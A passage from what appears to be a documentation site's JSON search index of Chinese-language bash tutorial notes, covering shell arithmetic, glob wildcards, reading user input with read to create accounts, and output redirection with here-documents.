$[\u8fd0\u7b97\u5f0f]"},{"location":"programming_language/bash/math/#2expr","text":"[root@localhost ~]# aa=11 [root@localhost ~]# bb=22 #\u7ed9\u53d8\u91cfaa\u548c\u53d8\u91cfbb\u8d4b\u503c [root@localhost ~]# dd=$(expr $aa + $bb) #dd\u7684\u503c\u662faa\u548cbb\u7684\u548c\u3002\u6ce8\u610f\u201c+\u201d\u53f7\u5de6\u53f3\u4e24\u4fa7\u5fc5\u987b\u6709\u7a7a\u683c","title":"2\u3001expr   \u6570\u503c\u8fd0\u7b97\u5de5\u5177"},{"location":"programming_language/bash/math/#3let","text":"\u5e38\u7528\u4e8ewhile\u5faa\u73af\u53d8\u91cf\u66f4\u65b0 let \u53d8\u91cf=\u503c\uff0c\u8fd0\u7b97\u516c\u5f0f\u91cc\u9762\u4e0d\u80fd\u6709\u7a7a\u683c [root@shell ~]# let sum=1+2 [root@shell ~]# echo $sum 3 [root@shell ~]# a=8 [root@shell ~]# b=5 [root@shell ~]# let ji=$a*$b [root@shell ~]# echo $ji 40 [root@shell ~]# let i++ //\u5728\u5faa\u73af\u4e2d\u66f4\u65b0\u53d8\u91cf\u503c\u5e38\u7528\u7684\uff0c\u6bcf\u6b21i\u7684\u503c\u52a01","title":"3\u3001let"},{"location":"programming_language/bash/math/#4linux","text":"[root@shell ~]# bc bc 1.06.95 Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc. This is free software with ABSOLUTELY NO WARRANTY. For details type `warranty'. 5/6 0 6/5 1 9/8 1 scale=3 //\u6307\u5b9a\u7cbe\u5ea6\uff0c\u7cbe\u5ea6\u5c31\u662f\u5c0f\u6570\u70b9\u540e\u4fdd\u7559\u51e0\u4f4d\u5c0f\u6570 9/8 1.125 1/3 0.333 ctrl + d \u9000\u51fa","title":"4\u3001Linux\u8ba1\u7b97\u5668"},{"location":"programming_language/bash/math/#4-declare","text":"\u9009\u9879\uff1a -\uff1a \u7ed9\u53d8\u91cf\u8bbe\u5b9a\u7c7b\u578b\u5c5e\u6027 +\uff1a\u53d6\u6d88\u53d8\u91cf\u7684\u7c7b\u578b\u5c5e\u6027 -i\uff1a\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u6574\u6570\u578b\uff08integer\uff09 -x\uff1a\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u73af\u5883\u53d8\u91cf -p\uff1a\u663e\u793a\u6307\u5b9a\u53d8\u91cf\u7684\u88ab\u58f0\u660e\u7684\u7c7b\u578ba : \u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u6570\u7ec4\u578b r\uff1a\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u53ea\u8bfb\u53d8\u91cf p\uff1a\u663e\u793a\u6307\u5b9a\u53d8\u91cf\u7684\u88ab\u58f0\u660e\u7684\u7c7b\u578b [root@localhost ~]# aa=11 [root@localhost ~]# bb=22 #\u7ed9\u53d8\u91cfaa\u548cbb\u8d4b\u503c [root@localhost ~]# declare -i cc=$aa+$bb 1\u3001\u53d8\u91cf\u58f0\u660e\u4e3a\u6570\u503c\u578b declare -i num=12 \u4e5f\u53ef\u4ee5\u67e5\u770b\u53d8\u91cf\u7c7b\u578b declare -p num \u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b declare -i num=\"12\" 2\u3001\u58f0\u660e\u6570\u7ec4\u53d8\u91cf \uff081\uff09\u5b9a\u4e49\u6570\u7ec4 arr[0]=x arr[1]=y declare -a arr[2]=z \uff082\uff09\u67e5\u770b\u6570\u7ec4 echo ${arr} ---\u7ed3\u679cx echo ${arr[2]} ---\u7ed3\u679cz echo ${arr[8]} ---\u7ed3\u679cx y z \u548c\u666e\u901a\u53d8\u91cf\u533a\u522b\u662f\u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u540c\u65f6\u4f7f\u7528\u4e0b\u6807\uff0c\u82e5\u6ca1\u6709\u4e0b\u6807\uff0c\u5219\u9ed8\u8ba4\u4f7f\u75280\u3002 3\u3001\u58f0\u660e\u73af\u5883\u53d8\u91cf declare -x t=123 export\u547d\u4ee4\u8c03\u7528\u7684\u4e5f\u662f\u4e0a\u9762declare -x \u7684\u547d\u4ee4 4\u3001\u58f0\u660e\u53d8\u91cf\u53ea\u8bfb\u5c5e\u6027 declare -r a=123 \u91cd\u65b0\u8d4b\u503c\u4f1a\u62a5\u9519\uff0c\u4e0d\u80fd\u4fee\u6539\uff0c\u4e0d\u80fd\u5220\u9664 5\u3001\u67e5\u770b\u53d8\u91cf\u5c5e\u6027 declare -p \u67e5\u770b\u6240\u6709\u53d8\u91cf\u5c5e\u6027 declare -p \u53d8\u91cf\u540d \u67e5\u770b\u6307\u5b9a\u53d8\u91cf\u7684\u5c5e\u6027","title":"4\u3001 declare\u547d\u4ee4"},{"location":"programming_language/bash/re/","text":"bash\u4e2d\u7684\u901a\u914d\u7b26 \\ \u8f6c\u4e49\u7b26\uff0c\u8ddf\u5728\\\u4e4b\u540e\u7684\u7279\u6b8a\u7b26\u53f7\u5c06\u5931\u53bb\u7279\u6b8a\u542b\u4e49\uff0c\u53d8\u4e3a\u666e\u901a\u5b57\u7b26\u3002\u5982\\$\u5c06\u8f93\u51fa\u201c$\u201d\u7b26\u53f7\uff0c\u800c\u4e0d\u5f53\u505a\u662f\u53d8\u91cf\u5f15\u7528\u3002 $ \u2014\u2014 \u7528\u6765\u63d0\u53d6\u53d8\u91cf\u503c [root@shell ~]# echo $USER root [root@shell ~]# echo $HOME /root ? \u2014\u2014 \u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26(\u4e0d\u80fd\u5339\u914d\u9690\u85cf\u6587\u4ef6) ? \u5339\u914d\u4e00\u4e2a\u4efb\u610f\u5b57\u7b26 [root@shell ~]# mkdir /script [root@shell ~]# cd /script/ [root@shell script]# touch {a,b,c,d,e}.txt [root@shell script]# touch haha.txt [root@shell script]# ls ?.txt a.txt b.txt c.txt d.txt e.txt * \u2014\u2014 \u5339\u914d0\u4e2a\u6216\u8005\u591a\u4e2a\u4efb\u610f\u5b57\u7b26\uff0c\u6ce8\u610f\u8fd9\u4e2a\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u7684 * \u4e0d\u540c * \u5339\u914d0\u4e2a\u6216\u4efb\u610f\u591a\u4e2a\u4efb\u610f\u5b57\u7b26\uff0c \u4e5f\u5c31\u662f\u53ef\u4ee5\u5339\u914d\u4efb\u4f55\u5185\u5bb9 [root@shell script]# ls *.txt a.txt b.txt c.txt d.txt e.txt haha.txt [abcde] \u2014\u2014 \u5339\u914d\u4e00\u7ec4\u5b57\u7b26\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a [] \u5339\u914d\u4e2d\u62ec\u53f7\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u3002 \u4f8b\u5982\uff1a [abc]\u4ee3\u8868\u4e00\u5b9a\u5339\u914d\u4e00\u4e2a\u5b57\u7b26\uff0c \u6216\u8005\u662fa\uff0c \u6216\u8005\u662fb\uff0c \u6216\u8005\u662fc\u3002 [-] \u5339\u914d\u4e2d\u62ec\u53f7\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c -\u4ee3\u8868\u4e00\u4e2a\u8303\u56f4\u3002 \u4f8b\u5982\uff1a [a-z] \u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\u3002 [^] \u903b\u8f91\u975e\uff0c \u8868\u793a\u5339\u914d\u4e0d\u662f\u4e2d\u62ec\u53f7\u5185\u7684\u4e00\u4e2a\u5b57\u7b26\u3002 \u4f8b\u5982\uff1a [^0-9] \u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u4e0d\u662f\u6570\u5b57\u7684\u5b57\u7b26\u3002 [root@shell script]# ls [acd].txt a.txt c.txt d.txt [root@shell script]# touch ac.txt [root@shell script]# ls [abcd][c].txt ac.txt [!abcde] \u2014\u2014 \u53d6\u53cd\uff0c\u5339\u914d\u9664\u4e86a\u3001b\u3001c\u3001d\u3001e\u4e4b\u5916\u7684\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 [root@shell script]# ls ac.txt a.txt b.txt c.txt d.txt e.txt haha haha.txt [root@shell script]# ls [!ac].txt b.txt d.txt e.txt \u5176\u4ed6","title":"bash\u7684\u901a\u914d\u7b26"},{"location":"programming_language/bash/re/#bash","text":"\\ \u8f6c\u4e49\u7b26\uff0c\u8ddf\u5728\\\u4e4b\u540e\u7684\u7279\u6b8a\u7b26\u53f7\u5c06\u5931\u53bb\u7279\u6b8a\u542b\u4e49\uff0c\u53d8\u4e3a\u666e\u901a\u5b57\u7b26\u3002\u5982\\$\u5c06\u8f93\u51fa\u201c$\u201d\u7b26\u53f7\uff0c\u800c\u4e0d\u5f53\u505a\u662f\u53d8\u91cf\u5f15\u7528\u3002 $ \u2014\u2014 \u7528\u6765\u63d0\u53d6\u53d8\u91cf\u503c [root@shell ~]# echo $USER root [root@shell ~]# echo $HOME /root ? \u2014\u2014 \u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26(\u4e0d\u80fd\u5339\u914d\u9690\u85cf\u6587\u4ef6) ? \u5339\u914d\u4e00\u4e2a\u4efb\u610f\u5b57\u7b26 [root@shell ~]# mkdir /script [root@shell ~]# cd /script/ [root@shell script]# touch {a,b,c,d,e}.txt [root@shell script]# touch haha.txt [root@shell script]# ls ?.txt a.txt b.txt c.txt d.txt e.txt * \u2014\u2014 \u5339\u914d0\u4e2a\u6216\u8005\u591a\u4e2a\u4efb\u610f\u5b57\u7b26\uff0c\u6ce8\u610f\u8fd9\u4e2a\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u7684 * \u4e0d\u540c * \u5339\u914d0\u4e2a\u6216\u4efb\u610f\u591a\u4e2a\u4efb\u610f\u5b57\u7b26\uff0c \u4e5f\u5c31\u662f\u53ef\u4ee5\u5339\u914d\u4efb\u4f55\u5185\u5bb9 [root@shell script]# ls *.txt a.txt b.txt c.txt d.txt e.txt haha.txt [abcde] \u2014\u2014 \u5339\u914d\u4e00\u7ec4\u5b57\u7b26\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a [] \u5339\u914d\u4e2d\u62ec\u53f7\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u3002 \u4f8b\u5982\uff1a [abc]\u4ee3\u8868\u4e00\u5b9a\u5339\u914d\u4e00\u4e2a\u5b57\u7b26\uff0c \u6216\u8005\u662fa\uff0c \u6216\u8005\u662fb\uff0c \u6216\u8005\u662fc\u3002 [-] \u5339\u914d\u4e2d\u62ec\u53f7\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c -\u4ee3\u8868\u4e00\u4e2a\u8303\u56f4\u3002 \u4f8b\u5982\uff1a [a-z] \u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\u3002 [^] \u903b\u8f91\u975e\uff0c \u8868\u793a\u5339\u914d\u4e0d\u662f\u4e2d\u62ec\u53f7\u5185\u7684\u4e00\u4e2a\u5b57\u7b26\u3002 \u4f8b\u5982\uff1a [^0-9] \u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u4e0d\u662f\u6570\u5b57\u7684\u5b57\u7b26\u3002 [root@shell script]# ls [acd].txt a.txt c.txt d.txt [root@shell script]# touch ac.txt [root@shell script]# ls [abcd][c].txt ac.txt [!abcde] \u2014\u2014 \u53d6\u53cd\uff0c\u5339\u914d\u9664\u4e86a\u3001b\u3001c\u3001d\u3001e\u4e4b\u5916\u7684\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 [root@shell script]# ls ac.txt a.txt b.txt c.txt d.txt e.txt haha haha.txt [root@shell script]# ls [!ac].txt b.txt d.txt e.txt \u5176\u4ed6","title":"bash\u4e2d\u7684\u901a\u914d\u7b26"},{"location":"programming_language/bash/read_var/","text":"read \u80fd\u591f\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u503c\uff0c\u7136\u540e\u4f20\u9012\u7ed9\u811a\u672c\u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4f9b\u4f7f\u7528 \u9884\u5236\u4ef6\uff1a echo\uff1a\u6253\u5370\u53d8\u91cf\u503c\u3001\u6253\u5370\u5b57\u7b26\u4e32\u7b49 -e\uff1a\u8ba9echo\u652f\u6301\u4ee5\u4e0b\u7b26\u53f7 \\t\uff1atab \\n\uff1a\u6362\u884c [root@shell script]# echo -e \"hello\\tworld\\nhello everyone\" hello world hello everyone -n\uff1a\u4e0d\u6362\u884c [root@shell script]# echo -n \"xxx\" xxx[root@shell script]# 1\u3001read \u8bfb\u53d6\u7528\u6237\u8f93\u5165 [root@shell script]# cat sc4.sh #!/bin/bash echo -n \"Please input the username you want to add: \" read username //read \u53d8\u91cf\u540d useradd $username && echo \"user $username added.\" [root@shell script]# sh sc4.sh Please input the username you want to add: jiujiu user jiujiu added. 2\u3001read \u81ea\u8eab\u663e\u793a\u63d0\u793a\u4fe1\u606f -p \u6253\u5370\u63d0\u793a\u7684 \u2014\u2014 prompt\uff1a\u63d0\u793a [root@shell script]# cp sc4.sh sc5.sh [root@shell script]# cat sc5.sh #!/bin/bash read -p \"Please input the username you want to add: \" username //read -p \u63d0\u793a\u4fe1\u606f \u53d8\u91cf\u540d useradd $username && echo \"user $username added.\" //\u63d0\u793a\u4fe1\u606f\u548c\u53d8\u91cf\u540d\u4e4b\u95f4\u5fc5\u6709\u7a7a\u683c [root@shell script]# sh sc5.sh Please input the username you want to add: doushuine user doushuine added. 3\u3001read \u4e0d\u56de\u663e\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f -s \u4e0d\u663e\u793a\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f [root@shell script]# cp sc5.sh sc6.sh [root@shell script]# cat sc6.sh #!/bin/bash read -p \"Please input the username you want to add: \" username read -s -p \"Please input the password you want to set: \" password echo //\u6362\u884c useradd $username && echo \"user $username added.\" echo $password | passwd --stdin $username &>/dev/null && echo \"password set successfully.\" [root@shell script]# sh sc6.sh Please input the username you want to add: taa Please input the password you want to set: user taa added. password set successfully. echo\uff1a\u53ef\u4ee5\u7528\u6765\u6253\u5370\u7a7a\u884c\u6216\u8005\u6362\u884c\u3002 4\u3001\u9650\u5236\u8bfb\u53d6\u65f6\u95f4 -t \u79d2\u6570 [root@shell script]# cp sc6.sh sc7.sh [root@shell script]# cat sc7.sh #!/bin/bash read -p \"Please input the username you want to add: \" -t 5 username //\u5355\u4f4d\u662f\u79d2 read -s -p \"Please input the password you want to set: \" password echo \"***\" useradd $username && echo \"user $username added.\" echo $password | passwd --stdin $username &>/dev/null && echo \"password set successfully.\" read\uff1a \u200b -p\uff1a\u6253\u5370\u63d0\u793a\u4fe1\u606f \u200b -s\uff1a\u4e0d\u56de\u663e\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f \u200b -t \u65f6\u95f4\uff1a\u9650\u5236\u8bfb\u53d6\u8f93\u5165\u7684\u7b49\u5f85\u65f6\u95f4","title":"shell\u8bfb\u53d6\u53d8\u91cf"},{"location":"programming_language/bash/read_var/#read","text":"\u80fd\u591f\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u503c\uff0c\u7136\u540e\u4f20\u9012\u7ed9\u811a\u672c\u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4f9b\u4f7f\u7528 \u9884\u5236\u4ef6\uff1a echo\uff1a\u6253\u5370\u53d8\u91cf\u503c\u3001\u6253\u5370\u5b57\u7b26\u4e32\u7b49 -e\uff1a\u8ba9echo\u652f\u6301\u4ee5\u4e0b\u7b26\u53f7 \\t\uff1atab \\n\uff1a\u6362\u884c [root@shell script]# echo -e \"hello\\tworld\\nhello everyone\" hello world hello everyone -n\uff1a\u4e0d\u6362\u884c [root@shell script]# echo -n \"xxx\" xxx[root@shell script]#","title":"read"},{"location":"programming_language/bash/read_var/#1read","text":"[root@shell script]# cat sc4.sh #!/bin/bash echo -n \"Please input the username you want to add: \" read username //read \u53d8\u91cf\u540d useradd $username && echo \"user $username added.\" [root@shell script]# sh sc4.sh Please input the username you want to add: jiujiu user jiujiu added.","title":"1\u3001read   \u8bfb\u53d6\u7528\u6237\u8f93\u5165"},{"location":"programming_language/bash/read_var/#2read","text":"-p \u6253\u5370\u63d0\u793a\u7684 \u2014\u2014 prompt\uff1a\u63d0\u793a [root@shell script]# cp sc4.sh sc5.sh [root@shell script]# cat sc5.sh #!/bin/bash read -p \"Please input the username you want to add: \" username //read -p \u63d0\u793a\u4fe1\u606f \u53d8\u91cf\u540d useradd $username && echo \"user $username added.\" //\u63d0\u793a\u4fe1\u606f\u548c\u53d8\u91cf\u540d\u4e4b\u95f4\u5fc5\u6709\u7a7a\u683c [root@shell script]# sh sc5.sh Please input the username you want to add: doushuine user doushuine added.","title":"2\u3001read   \u81ea\u8eab\u663e\u793a\u63d0\u793a\u4fe1\u606f"},{"location":"programming_language/bash/read_var/#3read","text":"-s \u4e0d\u663e\u793a\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f [root@shell script]# cp sc5.sh sc6.sh [root@shell script]# cat sc6.sh #!/bin/bash read -p \"Please input the username you want to add: \" username read -s -p \"Please input the password you want to set: \" password echo //\u6362\u884c useradd $username && echo \"user $username added.\" echo $password | passwd --stdin $username &>/dev/null && echo \"password set successfully.\" [root@shell script]# sh sc6.sh Please input the username you want to add: taa Please input the password you want to set: user taa added. password set successfully. echo\uff1a\u53ef\u4ee5\u7528\u6765\u6253\u5370\u7a7a\u884c\u6216\u8005\u6362\u884c\u3002","title":"3\u3001read \u4e0d\u56de\u663e\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f"},{"location":"programming_language/bash/read_var/#4","text":"-t \u79d2\u6570 [root@shell script]# cp sc6.sh sc7.sh [root@shell script]# cat sc7.sh #!/bin/bash read -p \"Please input the username you want to add: \" -t 5 username //\u5355\u4f4d\u662f\u79d2 read -s -p \"Please input the password you want to set: \" password echo \"***\" useradd $username && echo \"user $username added.\" echo $password | passwd --stdin $username &>/dev/null && echo \"password set successfully.\" read\uff1a \u200b -p\uff1a\u6253\u5370\u63d0\u793a\u4fe1\u606f \u200b -s\uff1a\u4e0d\u56de\u663e\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f \u200b -t \u65f6\u95f4\uff1a\u9650\u5236\u8bfb\u53d6\u8f93\u5165\u7684\u7b49\u5f85\u65f6\u95f4","title":"4\u3001\u9650\u5236\u8bfb\u53d6\u65f6\u95f4"},{"location":"programming_language/bash/redirect/","text":"\u91cd\u5b9a\u5411 \u6539\u53d8\u4f60\u547d\u4ee4\u8f93\u51fa\u7ed3\u679c\u7684\u4f4d\u7f6e \u6587\u4ef6\u63cf\u8ff0\u7b26 0 \uff1a\u6807\u51c6\u8f93\u5165 1 \uff1a\u6807\u51c6\u8f93\u51fa\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a 2 \uff1a\u9519\u8bef\u8f93\u51fa\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a > \uff1a\u6807\u51c6\u8f93\u51fa\u8986\u76d6\u91cd\u5b9a\u5411 >> \uff1a\u6807\u51c6\u8f93\u51fa\u8ffd\u52a0\u91cd\u5b9a\u5411 2> \uff1a\u9519\u8bef\u8f93\u51fa\u8986\u76d6\u91cd\u5b9a\u5411 2>> \uff1a\u9519\u8bef\u8f93\u51fa\u8ffd\u52a0\u91cd\u5b9a\u5411 < \uff1a\u8f93\u5165\u91cd\u5b9a\u5411\uff0c\u5e38\u7528\u4e8e\u811a\u672c\u4e2d while do command done < /test/list.txt //\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u53d8\u91cf [root@shell tmp]# echo y > b.txt [root@shell tmp]# rm douniwan rm: remove regular empty file `douniwan'? ^C [root@shell tmp]# rm douniwan < b.txt rm: remove regular empty file `douniwan'? [root@shell tmp]# ls douniwan ls: cannot access douniwan: No such file or directory << : \u6253\u5f00\u4e34\u65f6\u7f13\u51b2\u533a\uff0c\u4e00\u822c\u5728\u7f16\u8f91\u6216\u8005\u4fee\u6539\u6587\u4ef6\u65f6\u7528\uff0c\u4f46\u6211\u4eec\u4e00\u822c\u7528\u5b83\u6765\u751f\u6210\u6587\u4ef6\u3002 [root@shell tmp]# cat << EOF > /tmp/dhcpd.conf > subnet 172.16.0.0 netmask 255.255.0.0 { > range 172.16.254.100 172.16.254.200; > } > EOF [root@shell tmp]# cat /tmp/dhcpd.conf subnet 172.16.0.0 netmask 255.255.0.0 { range 172.16.254.100 172.16.254.200; } EOF\uff1a\u6587\u4ef6\u7ed3\u675f\u6807\u5fd7\uff0c\u6210\u5bf9\u51fa\u73b0\u7684\uff0c\u5199\u5728\u4ed6\u4eec\u4e4b\u95f4\u7684\u5185\u5bb9\u4f1a\u88ab\u5199\u5165\u6587\u4ef6\u4e2d \u53ef\u7528\u4e8e\uff1a 1\uff09\u7cfb\u7edf\u521d\u59cb\u5316\u65f6\u5019\uff0c\u751f\u6210yum\u5ba2\u6237\u7aef\u914d\u7f6e\u6587\u4ef6 [root@shell tmp]# init.sh cat << EOF > /tmp/local.repo [base] name=base baseurl=file:///mnt/cdrom enabled=1 gpgcheck=0 EOF [root@shell tmp]# chmod +x init.sh //\u7ed9\u811a\u672c\u6dfb\u52a0\u6267\u884c\u6743\u9650 [root@shell tmp]# ./init.sh [root@shell tmp]# cat local.repo //\u751f\u6210\u7684\u6587\u4ef6 [base] name=base baseurl=file:///mnt/cdrom enabled=1 gpgcheck=0 2\uff09\u5728\u5b89\u88c5\u914d\u7f6e\u670d\u52a1\u65f6\uff0c\u751f\u6210\u670d\u52a1\u7684\u914d\u7f6e\u6587\u4ef6\u7b49\uff0c\u4f8b\u5982dhcp\u7684\u5b89\u88c5\u914d\u7f6e\u811a\u672c [root@shell tmp]# cat dhcp.sh #!/bin/bash yum install dhcp -y cat << EOF > /etc/dhcp/dhcpd.conf subnet 172.16.0.0 netmask 255.255.0.0 { range 172.16.254.100 172.16.254.200; } EOF /etc/init.d/dhcpd start [root@shell ~]# sh dhcp.sh //\u8fd0\u884c\u811a\u672c 3\uff09\u7f16\u5199\u811a\u672c\u65f6\uff0c\u5199\u591a\u884c\u6ce8\u91ca [root@shell scripts]# multi_comm.sh #!/bin/sh <<COMMENT This is comment line 2 line 4 date COMMENT echo \"hello\" [root@shell scripts]# sh multi_comm.sh hello 1>&2 \uff1a \u6b63\u786e\u7684\u6309\u7167\u9519\u8bef\u7684\u8f93\u51fa [root@shell ~]# touch /tmp/douniwan [root@shell ~]# ls /tmp/douniwan /tmp/douniwan [root@shell ~]# ls /tmp/douniwan > a.txt [root@shell ~]# cat a.txt /tmp/douniwan [root@shell ~]# ls /tmp/douniwan /tmp/shui > haha.txt //\u6b63\u786e\u7684\u653e\u5230haha.txt ls: cannot access /tmp/shui: No such file or directory [root@shell ~]# ls /tmp/douniwan /tmp/shui > haha.txt 2> cry.txt //\u6b63\u786e\u7684\u653e\u5230haha.txt\uff0c\u9519\u8bef\u7684\u653e\u5230cry.txt\u4e2d [root@shell ~]# cat haha.txt /tmp/douniwan [root@shell ~]# cat cry.txt ls: cannot access /tmp/shui: No such file or directory [root@shell ~]# ls /tmp/douniwan /tmp/shui > haha.txt 2>&1 //\u6b63\u786e\u7684\u653e\u5728haha.txt\uff0c\u9519\u8bef\u7684\u4e5f\u653e\u5728\u8fd9\u91cc\u9762 [root@shell ~]# cat haha.txt ls: cannot access /tmp/shui: No such file or directory /tmp/douniwan 2>&1\uff1a\u9519\u8bef\u7684\u6309\u7167\u6b63\u786e\u7684\u8f93\u51fa &> \uff1a\u4e0d\u8bba\u5bf9\u9519\u90fd\u91cd\u5b9a\u5411\uff0c\u4e00\u822c\u5728\u811a\u672c\u4e2d\uff0c\u5199\u6cd5 &>/dev/null [root@shell ~]# ls /tmp/douniwan /tmp/shui &> haha.txt [root@shell ~]# cat haha.txt ls: cannot access /tmp/shui: No such file or directory /tmp/douniwan \u91cd\u5b9a\u5411\u53ef\u4ee5\u5b9a\u5411\u5230\u6587\u4ef6\u6216\u8005\u8bbe\u5907\u3002 \u91cd\u5b9a\u5411\u5230\u8bbe\u5907\uff1a \u7b2c\u4e00\u4e2a\u6807\u7b7e\uff1a\u67e5\u770b\u5f53\u524d\u7ec8\u7aef\u7684\u8bbe\u5907\u540d [root@shell ~]# tty /dev/pts/1 \u7b2c\u4e8c\u4e2a\u6807\u7b7e\uff1a [root@shell ~]# echo hello pts1 > /dev/pts/1 \u7b2c\u4e00\u4e2a\u6807\u7b7e\uff1a\u4f1a\u770b\u5230hello pts1 [root@shell ~]# hello pts1 \u5411\u6240\u6709\u767b\u5f55\u5230\u7cfb\u7edf\u7684\u7ec8\u7aef\u53d1\u6d88\u606f\uff1a [root@shell ~]# wall \"go out\" --- write all \u90fd\u7529\u5230\u7a7a\u91cc\u7684\u4e24\u79cd\u6a21\u5f0f \u547d\u4ee4 \u6807\u51c6\u8f93\u51fa \u9519\u8bef\u8f93\u51fa >/dev/null 2>&1 \u4e22\u5f03 \u4e22\u5f03 2>&1 >/dev/null \u4e22\u5f03 \u5c4f\u5e55 \u5176\u4ed6 Tee","title":"\u91cd\u5b9a\u5411"},{"location":"programming_language/bash/redirect/#_1","text":"\u6539\u53d8\u4f60\u547d\u4ee4\u8f93\u51fa\u7ed3\u679c\u7684\u4f4d\u7f6e \u6587\u4ef6\u63cf\u8ff0\u7b26 0 \uff1a\u6807\u51c6\u8f93\u5165 1 \uff1a\u6807\u51c6\u8f93\u51fa\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a 2 \uff1a\u9519\u8bef\u8f93\u51fa\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a > \uff1a\u6807\u51c6\u8f93\u51fa\u8986\u76d6\u91cd\u5b9a\u5411 >> \uff1a\u6807\u51c6\u8f93\u51fa\u8ffd\u52a0\u91cd\u5b9a\u5411 2> \uff1a\u9519\u8bef\u8f93\u51fa\u8986\u76d6\u91cd\u5b9a\u5411 2>> \uff1a\u9519\u8bef\u8f93\u51fa\u8ffd\u52a0\u91cd\u5b9a\u5411 < \uff1a\u8f93\u5165\u91cd\u5b9a\u5411\uff0c\u5e38\u7528\u4e8e\u811a\u672c\u4e2d while do command done < /test/list.txt //\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u53d8\u91cf [root@shell tmp]# echo y > b.txt [root@shell tmp]# rm douniwan rm: remove regular empty file `douniwan'? ^C [root@shell tmp]# rm douniwan < b.txt rm: remove regular empty file `douniwan'? [root@shell tmp]# ls douniwan ls: cannot access douniwan: No such file or directory << : \u6253\u5f00\u4e34\u65f6\u7f13\u51b2\u533a\uff0c\u4e00\u822c\u5728\u7f16\u8f91\u6216\u8005\u4fee\u6539\u6587\u4ef6\u65f6\u7528\uff0c\u4f46\u6211\u4eec\u4e00\u822c\u7528\u5b83\u6765\u751f\u6210\u6587\u4ef6\u3002 [root@shell tmp]# cat << EOF > /tmp/dhcpd.conf > subnet 172.16.0.0 netmask 255.255.0.0 { > range 172.16.254.100 172.16.254.200; > } > EOF [root@shell tmp]# cat /tmp/dhcpd.conf subnet 172.16.0.0 netmask 255.255.0.0 { range 172.16.254.100 172.16.254.200; } EOF\uff1a\u6587\u4ef6\u7ed3\u675f\u6807\u5fd7\uff0c\u6210\u5bf9\u51fa\u73b0\u7684\uff0c\u5199\u5728\u4ed6\u4eec\u4e4b\u95f4\u7684\u5185\u5bb9\u4f1a\u88ab\u5199\u5165\u6587\u4ef6\u4e2d \u53ef\u7528\u4e8e\uff1a 1\uff09\u7cfb\u7edf\u521d\u59cb\u5316\u65f6\u5019\uff0c\u751f\u6210yum\u5ba2\u6237\u7aef\u914d\u7f6e\u6587\u4ef6 [root@shell tmp]# init.sh cat << EOF > /tmp/local.repo [base] name=base baseurl=file:///mnt/cdrom enabled=1 gpgcheck=0 EOF [root@shell tmp]# chmod +x init.sh //\u7ed9\u811a\u672c\u6dfb\u52a0\u6267\u884c\u6743\u9650 [root@shell tmp]# ./init.sh [root@shell tmp]# cat local.repo //\u751f\u6210\u7684\u6587\u4ef6 [base] name=base baseurl=file:///mnt/cdrom enabled=1 gpgcheck=0 2\uff09\u5728\u5b89\u88c5\u914d\u7f6e\u670d\u52a1\u65f6\uff0c\u751f\u6210\u670d\u52a1\u7684\u914d\u7f6e\u6587\u4ef6\u7b49\uff0c\u4f8b\u5982dhcp\u7684\u5b89\u88c5\u914d\u7f6e\u811a\u672c [root@shell tmp]# cat dhcp.sh #!/bin/bash yum install dhcp -y cat << EOF > /etc/dhcp/dhcpd.conf subnet 172.16.0.0 netmask 255.255.0.0 { range 172.16.254.100 172.16.254.200; } EOF /etc/init.d/dhcpd start [root@shell ~]# sh dhcp.sh //\u8fd0\u884c\u811a\u672c 3\uff09\u7f16\u5199\u811a\u672c\u65f6\uff0c\u5199\u591a\u884c\u6ce8\u91ca [root@shell scripts]# multi_comm.sh #!/bin/sh <<COMMENT This is comment line 2 line 4 date COMMENT echo \"hello\" [root@shell scripts]# sh multi_comm.sh hello 1>&2 \uff1a \u6b63\u786e\u7684\u6309\u7167\u9519\u8bef\u7684\u8f93\u51fa [root@shell ~]# touch /tmp/douniwan [root@shell ~]# ls /tmp/douniwan /tmp/douniwan [root@shell ~]# ls /tmp/douniwan > a.txt [root@shell ~]# cat a.txt /tmp/douniwan [root@shell ~]# ls /tmp/douniwan 